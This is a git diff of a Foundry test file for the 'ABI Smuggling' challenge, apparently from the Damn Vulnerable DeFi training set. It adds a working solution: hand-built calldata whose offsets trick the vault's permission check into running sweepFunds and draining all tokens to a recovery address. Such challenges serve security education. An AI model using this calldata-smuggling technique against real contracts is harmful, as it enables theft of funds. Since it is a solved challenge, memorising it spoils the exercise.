@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -36,8 +36,8 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
-        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
-        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault)); // deployer could sweepFunds
+        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault)); // player has permission to withdraw
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -72,8 +72,24 @@ contract ABISmugglingChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    function prepareCalldata() public view returns (bytes memory finalData) {
+        bytes4 selectorExecute = bytes4(AuthorizedExecutor.execute.selector);
+
+        bytes memory maliciousCallData = abi.encode(
+            address(vault),
+            bytes32(uint256(0x80)),
+            bytes32(uint256(0x00)),
+            SelfAuthorizedVault.withdraw.selector,
+            bytes32(uint256(0x44))
+        );
+
+        bytes memory data = abi.encodeWithSelector(0x85fb709d, recovery, IERC20(address(token)));
+        finalData = abi.encodePacked(selectorExecute, maliciousCallData, data, bytes28(0x00));
+    }
+
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        (bool success,) = address(vault).call(prepareCalldata());
+        if (!success) revert("Malicious call failed");
     }
 
     /**
